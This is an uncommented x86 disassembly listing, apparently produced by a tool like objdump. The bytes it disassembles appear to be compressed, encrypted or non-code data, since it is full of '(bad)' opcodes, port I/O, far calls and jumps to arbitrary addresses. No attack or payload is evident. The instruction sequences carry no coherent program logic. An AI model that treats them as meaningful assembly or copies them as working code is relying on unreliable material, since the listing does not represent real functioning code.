  417d6a:	or     bl,BYTE PTR [esi+ecx*4+0x7d]
  417d6e:	(bad)
  417d72:	scas   eax,DWORD PTR es:[edi]
  417d73:	add    BYTE PTR [ecx+0x61aaffd8],dh
  417d79:	jle    0x417db2
  417d7b:	pop    ds
  417d7c:	xchg   BYTE PTR [eax-0x7],dh
  417d7f:	pop    eax
  417d80:	cmp    ebx,esi
  417d82:	ja     0x417db6
  417d84:	jae    0x417dac
  417d86:	jns    0x417d6c
  417d88:	mov    cl,0x5f
  417d8a:	sub    esp,DWORD PTR [ebp-0x33]
  417d8d:	les    eax,FWORD PTR [esi+0x7443d05e]
  417d93:	aad    0x8a
  417d95:	pop    ebp
  417d96:	fucomip st,st(7)
  417d98:	ror    DWORD PTR [ecx-0x7259aa6],1
  417d9e:	rcl    DWORD PTR [ebx+0x63],cl
  417da1:	icebp  
  417da2:	mov    bh,BYTE PTR [ecx]
  417da4:	jle    0x417db2
  417da6:	out    0x94,al
  417da8:	in     eax,0x15
  417daa:	mov    esi,0x8933aa41
  417daf:	out    dx,eax
  417db0:	or     al,0x7f
  417db2:	cwde   
  417db3:	mov    edx,0x34a1692f
  417db8:	add    edx,DWORD PTR [ebp+ecx*8-0x57]
  417dbc:	mov    ch,0xde
  417dbe:	out    dx,eax
  417dbf:	popa   
  417dc0:	cmp    eax,0xa1735aae
  417dc5:	les    esi,FWORD PTR [eax+0x7f]
  417dc8:	mov    edi,0xb656aeab
  417dcd:	retf   0x7030
  417dd0:	out    0x40,eax
  417dd2:	lea    esp,ds:0x57824272
  417dd8:	sub    eax,0x71b4c37d
  417ddd:	fwait
  417dde:	stos   BYTE PTR es:[edi],al
  417ddf:	enter  0x5f0d,0x40
  417de3:	dec    esi
  417de4:	pushf  
  417de5:	call   0xf4d16985
  417dea:	inc    ebx
  417deb:	pop    edx
  417dec:	lods   al,BYTE PTR ds:[esi]
  417ded:	push   ds
  417dee:	icebp  
  417def:	cmp    eax,0x6148efae
  417df4:	pop    ss
  417df5:	mov    ecx,0x9845bc0b
  417dfa:	dec    esi
  417dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dfc:	call   0x5e31:0x8f03f916
  417e03:	mov    cs,WORD PTR [edx+0x3306b932]
  417e09:	out    dx,al
  417e0a:	popf   
  417e0b:	xor    eax,0x4e2348cd
  417e10:	cmp    BYTE PTR [eax-0x34c8ca77],0xce
  417e17:	jecxz  0x417dee
  417e19:	fistp  DWORD PTR [edi]
  417e1b:	cld    
  417e1c:	arpl   WORD PTR ss:[ebx+0x74],sp
  417e20:	mov    edi,0x9fa8e726
  417e25:	jno    0x417e6b
  417e27:	or     ebx,DWORD PTR [edi-0x59]
  417e2a:	inc    eax
  417e2b:	rol    BYTE PTR [edx-0x45],1
  417e2e:	bound  ecx,QWORD PTR [esp+edi*4]
  417e31:	jmp    0x417e48
  417e33:	jnp    0x417e8e
  417e35:	mov    esi,0x5b2d91dc
  417e3a:	fstp   QWORD PTR [ebx+edx*8]
  417e3d:	loopne 0x417e5f
  417e3f:	stc    
  417e40:	mov    ch,0xd1
  417e42:	jg     0x417ebf
  417e44:	inc    edx
  417e45:	mov    ds:0xbc7ce8d2,al
  417e4a:	push   di
  417e4c:	lock mov edi,0xe780b42c
  417e52:	and    ebx,edx
  417e54:	and    BYTE PTR [edi],bh
  417e56:	stos   DWORD PTR es:[edi],eax
  417e57:	mov    BYTE PTR [esi],dl
  417e59:	push   ebp
  417e5a:	mov    esi,gs
  417e5c:	test   edi,edx
  417e5e:	or     BYTE PTR [edx],ch
  417e60:	mov    ah,0xae
  417e62:	add    eax,0x5fc5e865
  417e67:	in     al,0x28
  417e69:	gs push esi
  417e6b:	jae    0x417eb8
  417e6d:	push   ebx
  417e6e:	jle    0x417e04
  417e70:	add    ch,ch
  417e72:	(bad)  
  417e73:	xchg   edi,eax
  417e74:	inc    ecx
  417e75:	dec    edi
  417e76:	popf   
  417e77:	(bad)  
  417e79:	dec    ecx
  417e7a:	loope  0x417e84
  417e7c:	outs   dx,BYTE PTR ds:[esi]
  417e7d:	inc    ecx
  417e7e:	mov    edx,DWORD PTR [edi+0x4]
  417e81:	loope  0x417e2b
  417e83:	popf   
  417e84:	mov    al,ss:0xb7b4bdfe
  417e8a:	sbb    edx,edx
  417e8c:	mov    gs,edx
  417e8e:	mov    ah,0x59
  417e90:	test   eax,0xb78ae5b5
  417e95:	popf   
  417e96:	mov    eax,0xeb9a2b37
  417e9b:	aad    0xd1
  417e9d:	(bad)  
  417e9e:	jp     0x417ecd
  417ea0:	lods   al,BYTE PTR ds:[esi]
  417ea1:	ds sbb al,0xb7
  417ea4:	stos   BYTE PTR es:[edi],al
  417ea5:	sti    
  417ea6:	(bad)  
  417ea7:	xchg   ebx,eax
  417ea8:	mov    bh,0xfe
  417eaa:	push   eax
  417eab:	std    
  417eac:	in     eax,0x9e
  417eae:	mov    gs,esp
  417eb0:	xor    DWORD PTR [ecx-0x12],edi
  417eb3:	xor    dl,dh
  417eb5:	pop    ds
  417eb6:	mov    esi,esi
  417eb8:	pop    edx
  417eb9:	xchg   ebx,eax
  417eba:	aad    0xe
  417ebc:	push   edx
  417ebd:	mov    ?,WORD PTR [edi]
  417ebf:	repnz outs dx,BYTE PTR ds:[esi]
  417ec1:	int    0x35
  417ec3:	je     0x417ea5
  417ec5:	jb     0x417ef4
  417ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ec8:	mov    BYTE PTR ds:0x49f4fad7,dl
  417ece:	add    esi,DWORD PTR [ecx+0x19]
  417ed1:	test   BYTE PTR [eax+0x41],0x7f
  417ed5:	repz in eax,0x50
  417ed8:	and    eax,0xb6cca3f7
  417edd:	pop    esp
  417ede:	mov    ch,0x3c
  417ee0:	sahf   
  417ee1:	xor    BYTE PTR [edx],al
  417ee3:	mov    DWORD PTR [edx],ebp
  417ee5:	or     bl,BYTE PTR [esi+eax*8]
  417ee8:	add    BYTE PTR [edx],ch
  417eea:	or     ah,al
  417eec:	xchg   ebx,eax
  417eed:	test   eax,0x9043f969
  417ef2:	xor    BYTE PTR [edx+0x785c2af7],bh
  417ef8:	outs   dx,BYTE PTR ds:[esi]
  417ef9:	xchg   ecx,ecx
  417efb:	xor    ch,BYTE PTR [ebx]
  417efd:	es mov bh,0xe3
  417f00:	or     ah,BYTE PTR [esi+0x52eda58]
  417f06:	in     al,dx
  417f07:	ja     0x417f3e
  417f09:	jecxz  0x417ea0
  417f0b:	push   ecx
  417f0c:	fs clc 
  417f0e:	gs mov ah,0xcd
  417f11:	dec    ecx
  417f12:	inc    esi
  417f13:	push   es
  417f14:	dec    ebx
  417f15:	jmp    0x417f61
  417f17:	dec    eax
  417f18:	cwde   
  417f19:	adc    edx,DWORD PTR [edx]
  417f1b:	dec    ebx
  417f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f1d:	lahf   
  417f1e:	inc    edi
  417f1f:	repz xchg edx,eax
  417f21:	lock xor al,BYTE PTR [edi-0x3813a653]
  417f28:	sti    
  417f29:	stos   DWORD PTR es:[edi],eax
  417f2a:	inc    ecx
  417f2b:	or     al,0xd4
  417f2d:	test   al,0xac
  417f2f:	jmp    0x417f9d
  417f31:	idiv   DWORD PTR [edx+0x20fc2fce]
  417f37:	xor    eax,0x88c955e4
  417f3c:	in     al,dx
  417f3d:	cmp    eax,0x4a7dabb3
  417f42:	loopne 0x417f37
  417f44:	xor    eax,0xca176b16
  417f49:	cmp    bh,bh
  417f4b:	push   esp
  417f4c:	and    eax,0xb8843dc0
  417f51:	daa    
  417f52:	and    al,0x7b
  417f54:	xchg   edx,eax
  417f55:	adc    eax,0x96b04466
  417f5a:	jge    0x417fc8
  417f5c:	stos   DWORD PTR es:[edi],eax
  417f5d:	fiadd  WORD PTR [eax-0x2e]
  417f60:	pop    ds
  417f61:	xor    DWORD PTR [ebp+0x5702e5b7],ecx
  417f67:	mov    dl,0x6
  417f69:	jmp    0x7435:0x879c6043
  417f70:	push   0x227af3dd
  417f75:	sbb    cl,BYTE PTR [ebx+0x2cc9fc3e]
  417f7b:	mov    ch,0x65
  417f7d:	mov    bh,0x16
  417f7f:	push   0x9adc7ed4
  417f84:	outs   dx,DWORD PTR gs:[esi]
  417f86:	aam    0x46
  417f88:	std    
  417f89:	aas    
  417f8a:	pop    es
  417f8b:	push   edx
  417f8c:	and    al,0x79
  417f8e:	pop    ebx
  417f8f:	dec    ebp
  417f90:	inc    ebp
  417f91:	sar    BYTE PTR [ebp-0x66d710fd],cl
  417f97:	dec    ebx
  417f98:	mov    esp,0xab55d2d6
  417f9d:	fwait
  417f9e:	jns    0x417fcb
  417fa0:	aaa    
  417fa1:	add    eax,0x4f170bd4
  417fa6:	fadd   QWORD PTR [edi+0x4d]
  417fa9:	pop    es
  417faa:	mov    ss,WORD PTR [ebp+0x43]
  417fad:	inc    ebp
  417fae:	(bad)  
  417faf:	js     0x418022
  417fb1:	mov    ch,0x81
  417fb3:	mov    dh,0x89
  417fb5:	ret    0x1de5
  417fb8:	jne    0x41802f
  417fba:	mov    fs,ebx
  417fbc:	mov    dh,0xc2
  417fbe:	(bad)
  417fc2:	mov    bl,0x4e
  417fc4:	std    
  417fc5:	aas    
  417fc6:	cmp    al,BYTE PTR [ebx+edi*1+0x2]
  417fca:	cs pop edx
  417fcc:	push   0xae0ada57
  417fd1:	xlat   BYTE PTR cs:[ebx]
  417fd3:	scas   al,BYTE PTR es:[edi]
  417fd4:	xor    eax,0x9dad173e
  417fd9:	imul   ebx,DWORD PTR [ebp+0x73f64a83],0xffffffe7
  417fe0:	inc    BYTE PTR [ecx-0x1d]
  417fe3:	loope  0x417fbe
  417fe5:	loop   0x417ff9
  417fe7:	pop    ebx
  417fe8:	mov    eax,0xd468f713
  417fed:	pushf  
  417fee:	cmp    al,0x8c
  417ff0:	jl     0x417ffe
  417ff2:	leave  
  417ff3:	outs   dx,BYTE PTR ds:[esi]
  417ff4:	pop    ds
  417ff5:	adc    DWORD PTR [esi+eax*4+0x79639387],esi
  417ffc:	aad    0xb5
  417ffe:	mov    DWORD PTR [edi+edi*8-0x46cd4b87],edx
  418005:	shl    eax,0x89
  418008:	scas   eax,DWORD PTR es:[edi]
  418009:	pushf  
  41800a:	rcl    BYTE PTR [ebp-0x68f16e52],1
  418010:	aam    0x8e
  418012:	mov    ah,BYTE PTR [ebx-0x3d]
  418015:	jmp    esi
  418017:	dec    esp
  418018:	or     ebx,DWORD PTR [esi-0x7e30a024]
  41801e:	push   ebx
  41801f:	pop    esp
  418020:	dec    ecx
  418021:	into   
  418022:	and    al,0x68
  418024:	mov    al,ds:0x8436f8e3
  418029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41802a:	std    
  41802b:	push   ss
  41802c:	call   0xe4b5bfb8
  418031:	jne    0x41801e
  418033:	cmp    edx,edx
  418035:	fcom   QWORD PTR [ebp+0x47b36895]
  41803b:	jno    0x417fdc
  41803d:	fist   WORD PTR [eax-0x49f6595b]
  418043:	sbb    DWORD PTR [ebp-0xceabce6],ebx
  418049:	rol    ebx,1
  41804b:	leave  
  41804c:	xchg   ecx,eax
  41804d:	ficomp DWORD PTR fs:[ebp-0x5bf02dd0]
  418054:	jmp    0x41803a
  418056:	sbb    ebp,DWORD PTR [ebx+0x9]
  418059:	sub    DWORD PTR [esi],ebp
  41805b:	retf   0x58b6
  41805e:	add    al,0xde
  418060:	cmp    BYTE PTR [ecx+esi*2-0x46dac280],bh
  418067:	xor    dl,BYTE PTR [ecx]
  418069:	ret    
  41806a:	(bad)  
  41806b:	sub    ch,BYTE PTR [ebp-0x72ed22c3]
  418071:	sub    BYTE PTR [esi+0x71],al
  418074:	stos   BYTE PTR es:[edi],al
  418075:	jmp    0x4180cf
  418077:	sbb    ebx,DWORD PTR [edi-0x1c6efb23]
  41807d:	(bad)  
  41807e:	std    
  41807f:	or     eax,0xf728dc09
  418084:	sub    DWORD PTR [esi],edx
  418086:	inc    esi
  418087:	xchg   ecx,eax
  418088:	mov    ds:0xda031ebb,eax
  41808d:	dec    ecx
  41808e:	ja     0x4180a2
  418090:	sub    BYTE PTR [eax+0x8],bh
  418093:	pop    ecx
  418094:	mov    ch,0x92
  418096:	dec    ecx
  418097:	mov    bh,0xa6
  418099:	dec    edx
  41809a:	dec    esi
  41809b:	mov    ebx,0x2f6db9ca
  4180a0:	and    eax,0x8e4e3fd3
  4180a5:	jmp    0xa4852ff3
  4180aa:	mov    ds:0x74eb00f9,eax
  4180af:	mov    ch,0x0
  4180b1:	(bad)  [ebp+0x35]
  4180b4:	inc    esp
  4180b5:	call   0x7e8257cc
  4180ba:	add    edi,esp
  4180bc:	and    DWORD PTR [eax-0x80],ebx
  4180bf:	mov    ds:0x7c52f29b,eax
  4180c4:	mov    ebx,0xfe28e6f1
  4180c9:	jo     0x41804d
  4180cb:	add    al,0x92
  4180cd:	cmc    
  4180ce:	shr    DWORD PTR [esi],1
  4180d0:	dec    esp
  4180d1:	fidivr WORD PTR [edi+eax*4-0x5fc43493]
  4180d8:	xchg   ebp,eax
  4180d9:	lds    esi,FWORD PTR [ebx+0x4a934cf8]
  4180df:	cwde   
  4180e0:	aam    0xa7
  4180e2:	dec    ebx
  4180e3:	out    dx,eax
  4180e4:	leave  
  4180e5:	pop    esi
  4180e6:	push   eax
  4180e7:	or     edx,ebx
  4180e9:	lea    edi,ss:[ebp+0x3a]
  4180ed:	retf   0xd0e
  4180f0:	sets   BYTE PTR [eax+0x68]
  4180f4:	out    0xaa,eax
  4180f6:	call   0x5697:0xdabc7988
  4180fd:	lds    esi,FWORD PTR [ecx-0x74]
  418100:	jmp    0x9dc90287
  418105:	stos   BYTE PTR es:[edi],al
  418106:	jnp    0x41816e
  418108:	call   0x4763:0xc41a4bee
  41810f:	sbb    eax,DWORD PTR [ebx]
  418111:	sub    DWORD PTR ds:0xfb479cbf,ebx
  418117:	sub    al,0x24
  418119:	inc    ebp
  41811a:	bnd jge 0x418111
  41811d:	mov    bl,0x88
  41811f:	or     BYTE PTR [edi],dh
  418121:	pop    edi
  418122:	push   edx
  418123:	pop    esp
  418124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418125:	loop   0x41814b
  418127:	mov    ds:0xd11226ab,al
  41812c:	jb     0x41813d
  41812e:	mov    WORD PTR [ecx+ebx*2],gs
  418131:	inc    edx
  418132:	cmpxchg DWORD PTR [edx-0xcf98c3f],edx
  418139:	jmp    DWORD PTR [edx+0xeb35055]
  41813f:	inc    ebp
  418140:	jmp    DWORD PTR [edx+0xc]
  418143:	inc    ebx
  418144:	jb     0x4180db
  418146:	fisub  WORD PTR ss:[ebp+eax*4-0x31]
  41814b:	push   ss
  41814c:	jge    0x418127
  41814e:	aaa    
  41814f:	jbe    0x4180da
  418151:	sbb    edi,DWORD PTR [edx]
  418153:	jle    0x418180
  418155:	icebp  
  418156:	jns    0x4181c9
  418158:	mov    ebp,0xc423bd99
  41815d:	repnz jecxz 0x418101
  418160:	xchg   edx,eax
  418161:	xchg   BYTE PTR [edx-0x1a],al
  418164:	push   ebx
  418165:	mov    ebx,0x202f4ac9
  41816a:	pop    ebx
  41816b:	repz cmp BYTE PTR [edi-0x3fc76e6b],bl
  418172:	jmp    0x8a640e68
  418177:	lods   eax,DWORD PTR ds:[esi]
  418178:	lock mov esp,DWORD PTR [eax-0x190ee8ad]
  41817f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418180:	es rcr ch,1
  418183:	mov    bl,0xa6
  418185:	push   cs
  418186:	scas   al,BYTE PTR es:[edi]
  418187:	mov    WORD PTR [eax],es
  418189:	repnz pop ebx
  41818b:	xor    eax,0x643dbe55
  418190:	sbb    eax,0x91af3bf3
  418195:	or     DWORD PTR [esi-0x6a6d2329],esp
  41819b:	fmul   st(6),st
  41819d:	sbb    ch,BYTE PTR [edi-0x39f7307]
  4181a3:	mov    dl,0xbb
  4181a5:	add    edi,esi
  4181a7:	dec    eax
  4181a8:	mov    al,0x30
  4181aa:	push   ds
  4181ab:	mov    edx,0x5d4816e3
  4181b0:	clc    
  4181b1:	ins    DWORD PTR es:[edi],dx
  4181b2:	jle    0x4181bb
  4181b4:	jecxz  0x4181d9
  4181b6:	and    BYTE PTR [edx+0x3bba6dea],al
  4181bc:	test   al,0x5b
  4181be:	call   0xe4247bc
  4181c3:	fisub  DWORD PTR [edi]
  4181c5:	mov    DWORD PTR [edx-0x77525e27],ebx
  4181cb:	cmp    edi,edi
  4181cd:	fmulp  st(6),st
  4181cf:	mov    al,ds:0x9640940f
  4181d4:	mov    ds:0x27e99360,al
  4181d9:	fmul   st,st(2)
  4181db:	sbb    al,0xb2
  4181dd:	fcomp  QWORD PTR [ecx-0x53]
  4181e0:	adc    eax,0x390be2b
  4181e5:	pop    eax
  4181e6:	xor    bh,BYTE PTR [edi+ebp*2+0xb]
  4181ea:	retf   0x36f
  4181ed:	mov    eax,0x5d9ac73
  4181f2:	sub    eax,ebp
  4181f4:	fldl2t 
  4181f6:	jb     0x4181ed
  4181f8:	sub    bl,BYTE PTR ds:0x6ca0a4ae
  4181fe:	out    0x0,eax
  418200:	rol    BYTE PTR [ebx],cl
  418202:	retf   0xd07c
  418205:	dec    ecx
  418206:	shl    BYTE PTR [eax+eiz*2],0xc9
  41820a:	cdq    
  41820b:	or     edi,DWORD PTR ss:[edi]
  41820e:	call   0xf62c:0xf999952d
  418215:	rcr    DWORD PTR [edx],0xa7
  418218:	das    
  418219:	pop    eax
  41821a:	fstp   QWORD PTR [edi-0x471ee95f]
  418220:	jbe    0x4181db
  418222:	(bad)  
  418223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418224:	dec    ebp
  418225:	or     al,0x20
  418227:	xchg   edx,eax
  418228:	in     eax,0xff
  41822a:	nop
  41822b:	or     ebp,eax
  41822d:	mov    edi,0xcc32c2eb
  418232:	inc    eax
  418233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418234:	lahf   
  418235:	pop    ebx
  418236:	jecxz  0x418270
  418238:	leave  
  418239:	cmc    
  41823a:	jl     0x4181ca
  41823c:	es jg  0x4181f2
  41823f:	out    dx,eax
  418240:	mov    cl,0x91
  418242:	pop    ss
  418243:	xchg   ebp,eax
  418244:	inc    edx
  418245:	call   0x53cc:0xe9ac3b62
  41824c:	pop    ecx
  41824d:	mov    al,ds:0x75c6dd16
  418252:	xlat   BYTE PTR ds:[ebx]
  418253:	sbb    eax,0xd0ea662a
  418258:	adc    DWORD PTR [ecx-0x6a5f5e0d],0xffffffe4
  41825f:	xchg   edx,eax
  418260:	inc    ebp
  418261:	pusha  
  418262:	imul   eax,eax,0x8d4614a9
  418268:	popa   
  418269:	jle    0x41825a
  41826b:	and    edx,edx
  41826d:	xor    ah,ah
  41826f:	push   0x1d
  418271:	sub    al,0xc0
  418273:	imul   eax,DWORD PTR [ebx-0x27],0x3df44107
  41827a:	mov    ah,0xf3
  41827c:	dec    esi
  41827d:	gs in  al,0xf0
  418280:	lods   al,BYTE PTR ds:[esi]
  418281:	mov    cl,0xfc
  418283:	rol    DWORD PTR [esi],cl
  418285:	pop    ss
  418286:	call   0x28df937
  41828b:	not    DWORD PTR [ecx]
  41828d:	fadd   QWORD PTR [esi+0x10]
  418290:	call   0x37af8896
  418295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418296:	ja     0x4182e3
  418298:	mov    bh,0x1d
  41829a:	(bad)
  41829e:	sub    DWORD PTR [edx-0x42],ebx
  4182a1:	xor    al,0xb5
  4182a3:	fisubr WORD PTR [eax+0x323f3206]
  4182a9:	xor    BYTE PTR [edx-0x2b],ch
  4182ac:	aaa    
  4182ad:	xor    eax,0x4858c776
  4182b2:	pop    ds
  4182b3:	mov    esp,0x80d73f39
  4182b8:	(bad)  
  4182b9:	jnp    0x418262
  4182bb:	xor    al,0xa4
  4182bd:	inc    esp
  4182be:	xchg   edi,eax
  4182bf:	or     BYTE PTR [edx],cl
  4182c1:	push   cs
  4182c2:	dec    ebp
  4182c3:	das    
  4182c4:	test   al,0xca
  4182c6:	test   al,0xeb
  4182c8:	sar    edx,1
  4182ca:	inc    ecx
  4182cb:	aas    
  4182cc:	xor    DWORD PTR [eax+0x424306a2],ecx
  4182d2:	xor    al,0x41
  4182d4:	or     eax,0x896f95a0
  4182d9:	cdq    
  4182da:	std    
  4182db:	mov    bl,0x2
  4182dd:	cli    
  4182de:	fidiv  WORD PTR [edi+0x712fedfa]
  4182e4:	or     BYTE PTR [ebp-0x66],0x9c
  4182e8:	loope  0x41832f
  4182ea:	mov    ch,0x1f
  4182ec:	jmp    0xae8ad7bc
  4182f1:	sti    
  4182f2:	sub    ah,0x10
  4182f5:	rcr    BYTE PTR [ecx],0xc3
  4182f8:	pushf  
  4182f9:	sbb    bl,ah
  4182fb:	hlt    
  4182fc:	sub    eax,0x739cf6e2
  418301:	mov    dl,0x4f
  418303:	adc    DWORD PTR [esi-0x2ede7446],0x3c
  41830a:	mov    al,ds:0x7efa111f
  41830f:	dec    esp
  418310:	ret    
  418311:	in     eax,0xe0
  418313:	pop    esp
  418314:	jns    0x41838c
  418316:	cmp    eax,0x54569a9d
  41831b:	pop    edx
  41831c:	into   
  41831d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41831e:	mov    ch,0xee
  418320:	or     bh,BYTE PTR [esi]
  418322:	sbb    al,ah
  418324:	dec    edx
  418325:	std    
  418326:	mov    ds:0xb59a5825,eax
  41832b:	xor    DWORD PTR [eax+0x30],ebx
  41832e:	not    ecx
  418330:	cmp    al,0x3c
  418332:	pop    ebp
  418333:	adc    DWORD PTR [eax],0xd8deb150
  418339:	dec    esi
  41833a:	xor    al,0xc2
  41833c:	cmp    bl,0xeb
  41833f:	mov    DWORD PTR ds:0x9f666d26,ebp
  418345:	ficom  DWORD PTR [ebp+eax*1+0x287c9ce3]
  41834c:	pop    esp
  41834d:	mov    BYTE PTR [ebp+0x14],bl
  418350:	fxch   st(5)
  418352:	inc    esi
  418353:	sbb    ah,bl
  418355:	pop    ss
  418356:	inc    esi
  418357:	sbb    al,0xe7
  418359:	mov    eax,0x8de4d5bc
  41835e:	iret   
  41835f:	inc    eax
  418360:	add    eax,0x299c77da
  418365:	es push eax
  418367:	cwde   
  418368:	lahf   
  418369:	push   esp
  41836a:	jo     0x418364
  41836c:	xor    eax,0x80e0b055
  418371:	pop    ss
  418372:	inc    edi
  418373:	mov    ah,0x50
  418375:	js     0x418391
  418377:	in     al,0x8f
  418379:	push   ebx
  41837a:	inc    ebp
  41837b:	xor    al,0x6d
  41837d:	xor    DWORD PTR [edx],ebx
  41837f:	lahf   
  418380:	rcr    BYTE PTR [edi-0x32],cl
  418383:	mov    cl,BYTE PTR [eax-0x9]
  418386:	pop    eax
  418387:	xchg   esp,eax
  418388:	add    bl,BYTE PTR [ebp+0x7c07c27b]
  41838e:	add    eax,0x306e9c75
  418393:	(bad)  
  418394:	cli    
  418395:	(bad)  
  418396:	fidiv  WORD PTR [ebx]
  418398:	retf   0xc2f5
  41839b:	mov    DWORD PTR [esi-0x8],edi
  41839e:	in     al,0xe0
  4183a0:	inc    ebp
  4183a1:	mov    ds:0xd24163ca,eax
  4183a6:	jb     0x4183d7
  4183a8:	push   0xfc04ed75
  4183ad:	pop    ecx
  4183ae:	sbb    eax,0xc78a7709
  4183b3:	ins    DWORD PTR es:[edi],dx
  4183b4:	jnp    0x418382
  4183b6:	sub    ebx,DWORD PTR [edx+0x57]
  4183b9:	retf   0x95eb
  4183bc:	pop    ds
  4183bd:	add    al,0x66
  4183bf:	jl     0x418425
  4183c1:	cli    
  4183c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183c3:	mov    edx,0xb056342f
  4183c8:	fs mov al,0xab
  4183cb:	lock push ebx
  4183cd:	lods   al,BYTE PTR ds:[esi]
  4183ce:	jmp    0x4183ca
  4183d0:	xchg   ecx,eax
  4183d1:	rcr    edx,cl
  4183d3:	call   0x6d00:0x160f540b
  4183da:	retf   0x72ff
  4183dd:	and    BYTE PTR [esi-0x27483911],ah
  4183e3:	lahf   
  4183e4:	inc    ebx
  4183e5:	call   0x13d9bdc2
  4183ea:	pop    eax
  4183eb:	shl    BYTE PTR [edx-0x20af33fd],1
  4183f1:	jmp    0x1b1aa4c3
  4183f6:	enter  0xd667,0x35
  4183fa:	imul   esp,DWORD PTR [ebp+0x44f2ec44],0x666d48ee
  418404:	cdq    
  418405:	nop
  418406:	xlat   BYTE PTR ds:[ebx]
  418407:	mov    DWORD PTR [esp+edx*4],0x508e02bf
  41840e:	and    eax,0x7e03d0b7
  418413:	adc    eax,0xbe36e399
  418418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418419:	cmp    ebx,DWORD PTR [eax+0x4047f5db]
  41841f:	(bad)  
  418420:	mov    bh,0x1f
  418422:	push   esp
  418423:	or     al,0x59
  418425:	dec    ebx
  418426:	xchg   esp,eax
  418427:	in     eax,0xad
  418429:	int3   
  41842a:	inc    ecx
  41842b:	retf   0xb922
  41842e:	pop    ebp
  41842f:	dec    eax
  418430:	dec    ecx
  418431:	pop    esp
  418432:	add    eax,DWORD PTR [eax+edx*2-0x726182f]
  418439:	mov    cl,0x73
  41843b:	mov    gs,WORD PTR [esi+0x7f]
  41843e:	xchg   edi,eax
  41843f:	test   DWORD PTR [edi+0x6c],edx
  418442:	add    DWORD PTR [ebx],0xfffffff3
  418445:	jmp    0xbfe2:0x75d633cc
  41844c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41844d:	out    dx,eax
  41844e:	je     0x418405
  418450:	enter  0xc16f,0xf3
  418454:	pop    es
  418455:	test   al,0x1b
  418457:	push   edi
  418458:	add    eax,0x7081691b
  41845d:	fidiv  WORD PTR [ebx-0x2d]
  418460:	nop
  418461:	std    
  418462:	scas   eax,DWORD PTR es:[edi]
  418463:	int3   
  418464:	stos   BYTE PTR es:[edi],al
  418465:	mov    eax,ds:0xd5b5545
  41846a:	loope  0x418445
  41846c:	sub    esi,eax
  41846e:	outs   dx,BYTE PTR ds:[esi]
  41846f:	or     al,0xb1
  418471:	mov    DWORD PTR [esi],ecx
  418473:	jmp    0x4184e6
  418475:	jne    0x41840d
  418477:	add    BYTE PTR [ebx-0xf],0x3c
  41847b:	jmp    0x4184b8
  41847d:	inc    ebx
  41847e:	add    edx,DWORD PTR [ebx]
  418480:	std    
  418481:	fst    QWORD PTR [ebx+edx*4]
  418484:	push   edx
  418485:	gs hlt 
  418487:	lods   al,BYTE PTR ds:[esi]
  418488:	ins    DWORD PTR es:[edi],dx
  418489:	cld    
  41848a:	add    al,0xca
  41848c:	test   al,0x94
  41848e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41848f:	or     edi,DWORD PTR [edx+0x90a5ee8]
  418495:	add    esp,edi
  418497:	mov    eax,0x318495e7
  41849c:	jg     0x41848e
  41849e:	in     al,0x9b
  4184a0:	stos   DWORD PTR es:[edi],eax
  4184a1:	retf   0x6767
  4184a4:	das    
  4184a5:	aad    0xc5
  4184a7:	sbb    ecx,DWORD PTR [esi+0xccf256]
  4184ad:	scas   eax,DWORD PTR es:[edi]
  4184ae:	aam    0x2f
  4184b0:	sub    al,dh
  4184b2:	or     BYTE PTR [edi+ebp*2],dh
  4184b5:	adc    DWORD PTR [ecx],ebp
  4184b7:	or     edx,ecx
  4184b9:	test   BYTE PTR [ecx+ebp*1],ah
  4184bc:	and    eax,0xe1dbf6af
  4184c1:	cmovnp ecx,eax
  4184c4:	jge    0x41848d
  4184c6:	shl    ah,0x24
  4184c9:	test   BYTE PTR [ecx],0xa4
  4184cc:	lods   eax,DWORD PTR ds:[esi]
  4184cd:	lods   eax,DWORD PTR ds:[esi]
  4184ce:	ins    DWORD PTR es:[edi],dx
  4184cf:	or     eax,0x809d8fa
  4184d4:	sub    ah,BYTE PTR [ebx+0x7d]
  4184d7:	push   ebx
  4184d8:	lahf   
  4184d9:	fisttp DWORD PTR [ebx-0x34]
  4184dc:	sub    eax,DWORD PTR [edx]
  4184de:	clc    
  4184df:	arpl   WORD PTR [ecx-0x5bcd20b1],dx
  4184e5:	lahf   
  4184e6:	sub    eax,0x82c2e422
  4184eb:	sti    
  4184ec:	xlat   BYTE PTR gs:[ebx]
  4184ee:	inc    edx
  4184ef:	cmp    bh,BYTE PTR ds:[esi*2-0x18c8725f]
  4184f7:	inc    eax
  4184f8:	mov    WORD PTR [edx-0xb8cd689],?
  4184fe:	mov    dh,0xd7
  418500:	mov    edx,DWORD PTR [edx+0x78]
  418503:	arpl   bp,bx
  418505:	in     al,0x58
  418507:	push   ebx
  418508:	dec    edx
  418509:	lods   al,BYTE PTR ds:[esi]
  41850a:	push   cs
  41850b:	adc    ah,BYTE PTR [ebp-0x780ace69]
  418511:	aam    0x87
  418513:	sub    ah,BYTE PTR [esi]
  418515:	pushf  
  418516:	pop    edi
  418517:	call   0xbc7c:0xacd6b989
  41851e:	int3   
  41851f:	xor    DWORD PTR [esi+0x1c],esp
  418522:	xor    al,0xfe
  418524:	xchg   edi,eax
  418525:	repz popa 
  418527:	repz ja 0x4184d1
  41852a:	pop    ss
  41852b:	jg     0x418574
  41852d:	mov    BYTE PTR [ebp-0x7],cl
  418530:	int3   
  418531:	pop    ds
  418532:	rcr    edx,cl
  418534:	nop
  418535:	aam    0x8
  418537:	mov    dh,dl
  418539:	aaa    
  41853a:	pop    edx
  41853b:	das    
  41853c:	test   al,0x50
  41853e:	bound  ecx,QWORD PTR [eax-0x6]
  418541:	pop    edx
  418542:	dec    esi
  418543:	dec    esp
  418544:	cmp    cl,BYTE PTR [ebx+0x31]
